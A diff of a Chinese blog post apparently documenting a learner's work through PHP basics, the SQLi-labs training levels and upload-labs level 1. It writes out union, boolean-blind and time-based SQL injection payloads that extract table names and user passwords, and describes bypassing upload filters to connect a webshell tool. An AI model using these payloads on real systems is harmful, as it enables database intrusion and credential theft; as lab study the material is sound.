@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="">
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="一.初识php 1.php语法 php整个代码以<?php开始，?>结束，中间为脚本代码。\n如“hello world”\n1 2 3 &lt;?php echo &#34;hello world&#34; ?&gt; 作用为输出hello world\n2.php变量 一般在变量前加$，代表传输变量赋值，比如:\n">
 <title>Task1</title>
 
 <link rel='canonical' href='https://baoanleo.github.io/p/task1/'>
 
 <link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="Task1">
-<meta property='og:description' content="">
+<meta property='og:description' content="一.初识php 1.php语法 php整个代码以<?php开始，?>结束，中间为脚本代码。\n如“hello world”\n1 2 3 &lt;?php echo &#34;hello world&#34; ?&gt; 作用为输出hello world\n2.php变量 一般在变量前加$，代表传输变量赋值，比如:\n">
 <meta property='og:url' content='https://baoanleo.github.io/p/task1/'>
 <meta property='og:site_name' content='cosleo-Blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-09-27T15:32:07&#43;08:00'/><meta property='article:modified_time' content='2024-09-27T15:32:07&#43;08:00'/>
 <meta name="twitter:title" content="Task1">
-<meta name="twitter:description" content="">
+<meta name="twitter:description" content="一.初识php 1.php语法 php整个代码以<?php开始，?>结束，中间为脚本代码。\n如“hello world”\n1 2 3 &lt;?php echo &#34;hello world&#34; ?&gt; 作用为输出hello world\n2.php变量 一般在变量前加$，代表传输变量赋值，比如:\n">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -270,7 +270,66 @@
     </ol>
 </aside>
 
-    
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1php语法">1.php语法</a></li>
+    <li><a href="#2php变量">2.php变量</a></li>
+    <li><a href="#3echoprint">3.echo/print</a></li>
+    <li><a href="#4eof">4.EOF</a></li>
+    <li><a href="#5php类型比较">5.php类型比较</a></li>
+    <li><a href="#6php常量">6.php常量</a></li>
+    <li><a href="#7php字符串">7.php字符串</a></li>
+    <li><a href="#8for-循环">8.for 循环</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#第一关">第一关</a></li>
+    <li><a href="#第二关">第二关</a></li>
+    <li><a href="#第五关">第五关</a></li>
+    <li><a href="#第八关">第八关</a></li>
+    <li><a href="#第九关">第九关</a></li>
+  </ol>
+
+  <ol>
+    <li><a href="#第一关-1">第一关</a></li>
+    <li><a href="#第二关-1">第二关</a></li>
+    <li><a href="#第三关">第三关</a></li>
+    <li><a href="#第四关">第四关</a></li>
+    <li><a href="#第五关-1">第五关</a></li>
+    <li><a href="#第六关">第六关</a></li>
+    <li><a href="#第七关">第七关</a></li>
+    <li><a href="#第八关-1">第八关</a></li>
+    <li><a href="#第九关-1">第九关</a></li>
+    <li><a href="#第十关">第十关</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
 
             <main class="main full-width">
     <article class="main-article">
@@ -318,7 +377,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 0 分钟
+                    阅读时长: 10 分钟
                 </time>
             </div>
         
@@ -333,7 +392,803 @@
     <section class="article-content">
     
     
-    
+    <h1 id="一初识php">一.初识php
+</h1><h2 id="1php语法">1.php语法
+</h2><p>php整个代码以<?php开始，?>结束，中间为脚本代码。</p>
+<p>如“hello world”</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php 
+</span></span><span class="line"><span class="cl">echo &#34;hello world&#34;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>作用为输出hello world</p>
+<h2 id="2php变量">2.php变量
+</h2><p>一般在变量前加$，代表传输变量赋值，比如:</p>
+<p>$id,就是一个变量在sql注入中url中会有参数传递，也正是因为有参数传递所以才有sql注入的出现，</p>
+<p>比如url中会有/?id=1，id就是一个变量，而在php代码中，会写出“$id”,这个时候1就会传输给id变量。</p>
+<p>php变量命名规则：</p>
+<ol>
+<li>以$开始，后面是变量名字</li>
+<li>变量名必须是以字母或者下划线开始</li>
+<li>变量只能包含字母，数字以及下划线</li>
+<li>变量不能有空格</li>
+<li><strong>变量是区分大小写的</strong></li>
+</ol>
+<p>php当中也有变量作用域： local ，global，static ， parameter</p>
+<p>global是全局变量，声明了可以在整个代码中使用，static是静态变量，它不会被删除，</p>
+<h2 id="3echoprint">3.echo/print
+</h2><p>echo可以输出字符</p>
+<p>比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">echo &#34;hello world&#34;
+</span></span><span class="line"><span class="cl">$id=1
+</span></span><span class="line"><span class="cl">echo $id &#39;&#39;&#39;输出变量id=1&#39;&#39;&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>echo和print的区别：</p>
+<ol>
+<li>echo可以输出一个或者多个字符串且没有返回值，print只能输出一个且返回值为1</li>
+<li>echo输出速度快</li>
+</ol>
+<h2 id="4eof">4.EOF
+</h2><p>是定义一个字符串的方法</p>
+<p>&laquo;&lt;EOF开始 ，EOF结束，结束的标记必须顶格写不能有空格，且要有分号</p>
+<p>比如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$name=&#34;leo&#34;;
+</span></span><span class="line"><span class="cl">$id= &lt;&lt;&lt;EOF
+</span></span><span class="line"><span class="cl">        &#34;lili&#34;$name
+</span></span><span class="line"><span class="cl">        &#34;123&#34;
+</span></span><span class="line"><span class="cl">EOF;
+</span></span><span class="line"><span class="cl">echo $id;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5php类型比较">5.php类型比较
+</h2><p>弱类型比较 == ：只比较值，不比较类型。</p>
+<p>强类型比较 ===：即比较值，也比较类型。</p>
+<p>在web攻防中，会碰上缺陷函数绕过，这时就是通过== 和  ===进行绕过。如md5比较如果是弱类型比较它只会比较加密后的前两个字符是否相同：0e，</p>
+<p>若是===那么就必须通过数组绕过，因为md5不接受加密数组。</p>
+<h2 id="6php常量">6.php常量
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>name ：常量名字</p>
+</li>
+<li>
+<p>value：常量的值</p>
+</li>
+<li>
+<p>case_insensitive：若为TRUE,则常量大小写不敏感。</p>
+<p>注意使用时，常量不能带$，否则会报错</p>
+</li>
+</ul>
+<h2 id="7php字符串">7.php字符串
+</h2><p>.可以把两个字符串链接在一起</p>
+<h2 id="8for-循环">8.for 循环
+</h2><p>foreach用于遍历数组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">foreach ($array as $value)
+</span></span><span class="line"><span class="cl">{
+</span></span><span class="line"><span class="cl">    要执行代码;
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="二sql注入">二.sql注入
+</h1><p>sql注入其实就是通过sql语句去执行数据库操作达到入侵的效果，主要看是否有参数传递，如果url没有参数传递，也可查看是否有账号登录这种post提交的方法，，查询方式包括会员注册，删除新闻，修改文章等等要与数据库进行交互的方式。</p>
+<h2 id="第一关">第一关
+</h2><p>通过输入‘来判断变量值是否是字符型注入还是数字型注入，第一关为字符型注入，因为我们输入了’后出现报错，为了方便，在源代码中我用echo $sql；让sql语句输出，可以更好的观看。</p>
+<p><img src="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA.jpg"
+	width="2053"
+	height="1117"
+	srcset="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA_hu5649014817252073235.jpg 480w, /p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E4%B8%AA_hu14441234819371218347.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="441px"
+	
+></p>
+<p>1.猜列数</p>
+<p>使用语法order by 查看有几个回显位数，若是正确的位数则不会报错。- - +是屏蔽后面的limit 语句。</p>
+<p><img src="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C.jpg"
+	width="2054"
+	height="1253"
+	srcset="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C_hu5592515777284831677.jpg 480w, /p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C_hu9744040273408216186.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="163"
+		data-flex-basis="393px"
+	
+></p>
+<p>获得有3位显示位后可以采取</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39;union select 1,2,3--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>为什么采取id=-1呢，因为如果id=1而此时id=1会放到数据库中去查询，刚好id=1是有值的，这个时候我们输入的select 1,2,3就没法回显到屏幕上，当然也可以采取id=100，若此时数据库中没有id=100，这时候就会爆出显示位。</p>
+<p>获得显示位后，就可以在显示位上运用函数或者sql语句进行信息搜集比如version()查看数据库版本，database()查看当前数据库。</p>
+<p>2.爆表</p>
+<p>通过mysql独有的information_schema库来得到该数据库的表</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码是查询information_schema下的所有表，并且table_schema的值等于security，并且将这些表的名字通过group_concat函数联合起来</p>
+<p><img src="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89.jpg"
+	width="2052"
+	height="1521"
+	srcset="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89_hu16932669044390809790.jpg 480w, /p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%89_hu6120641468051180448.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="323px"
+	
+></p>
+<p>3.爆字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>跟爆表差不多就是查询字段名</p>
+<p><img src="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B.jpg"
+	width="2052"
+	height="1521"
+	srcset="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B_hu16598470441040145622.jpg 480w, /p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E5%9B%9B_hu16713642939375806306.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="323px"
+	
+></p>
+<p>4.爆出用户名，密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,2,group_concat(username ,id , password) from users--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94.jpg"
+	width="2052"
+	height="1521"
+	srcset="/p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94_hu631484310880449493.jpg 480w, /p/task1/sql%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%94_hu623627177415701375.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="134"
+		data-flex-basis="323px"
+	
+></p>
+<h2 id="第二关">第二关
+</h2><p>第二关是数字型，不用‘注入，其他手段跟第一关一模一样，如何判断是否为数字型，通过id=1’- - +发现会报错，而id=1- -+不会报错是正常显示，说明是数字型。</p>
+<h2 id="第五关">第五关
+</h2><p>第五关无论我们输入什么都是显示you are in。。。，这个时候联合注入就没用了，我们可以用布尔盲注来注入。</p>
+<p>这里来说明一下：</p>
+<p>有数据库输出判断标准：基于布尔</p>
+<p>有数据库报错处理判断标准：基于报错</p>
+<p>都不需要：基于延时</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select database()))&gt;7--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断数据库名字长度是否大于9</p>
+<p>若正确会显示you are in，错误则什么都不会显示。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select database()),1,1))=115--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这段代码挨个字符猜测长度来把每个表给猜出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这段代码查看所有字段的长度</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断每个字段的每个字符的ascii码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断字段中所有内容的长度</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>猜测每个内容的每个字符的长度。</p>
+<h2 id="第八关">第八关
+</h2><p>第八关和第五关一样可以运用布尔盲注进行注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select database()))&gt;7--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断数据库名字长度是否大于9</p>
+<p>若正确会显示you are in，错误则什么都不会显示。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select database()),1,1))=115--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这句代码是取数据库名字的第一个字的ascii码，若等于115则显示正确。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这段代码是相当于关卡一爆表的代码只不过是看所有表的长度是否大于了13。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这段代码挨个字符猜测长度来把每个表给猜出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;20--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这段代码查看所有字段的长度</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;99--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断每个字段的每个字符的ascii码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and length((select group_concat(username,password) from users))&gt;109--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>判断字段中所有内容的长度</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and ascii(substr((select group_concat(username,password) from users),1,1))&gt;50--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>猜测每个内容的每个字符的长度。</p>
+<h2 id="第九关">第九关
+</h2><p>第九关输入什么都是一样的这时我们可以用延时注入。</p>
+<p>这个语句就是延时注入，如果1=1则执行sleep(2)，否则执行1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(1=1,sleep(2),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么我们可以得到以下代码，如果数据库名字长度大于9则执行sleep(2),否则执行1</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and if(length((select database()))&gt;9,sleep(2),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过跟取ascii码拆分数据库每一个字符的ASCII码，若正确则执行sleep(2)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select database()),1,1))=115,sleep(2),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面跟第五关语句基本类似</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(2),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;10,sleep(2),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;))&gt;10,sleep(2),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),1,1))&gt;10,sleep(2),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(length((select group_concat(username,password) from users))&gt;10,sleep(2),1)--+
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;10,sleep(2),1)--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="三upload-labs">三.upload-labs
+</h1><h2 id="第一关-1">第一关
+</h2><p>查看源码发现是白名单。</p>
+<p>第一种</p>
+<p>上传php文件进行抓包，发现提示只能上传.jpg|.png|.gif文件，可能是前端检测，使用浏览器进行审查元素，发现有前端检测的函数，删除函数即可绕过。</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D.jpg"
+	width="822"
+	height="121"
+	srcset="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu939069164431406544.jpg 480w, /p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%B8%80%E7%A7%8D_hu8221241383826972254.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="679"
+		data-flex-basis="1630px"
+	
+></p>
+<p>第二种</p>
+<p>上传jpg文件，进行抓包，在抓包软件中修改文件后缀，达到上传php文件</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D.jpg"
+	width="1494"
+	height="807"
+	srcset="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D_hu17826614962547444776.jpg 480w, /p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D_hu11809900642452438820.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+<p>连接蚁剑</p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2.jpg"
+	width="1542"
+	height="409"
+	srcset="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2_hu9378591027626085856.jpg 480w, /p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D2_hu2162727462261360044.jpg 1024w"
+	loading="lazy"
+	
+		alt="Photo"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="377"
+		data-flex-basis="904px"
+	
+></p>
+<p><img src="/p/task1/%E7%AC%AC%E4%B8%80%E5%85%B3%E7%AC%AC%E4%BA%8C%E7%A7%8D3.jpg"
+	width="1545"
+	height="437"
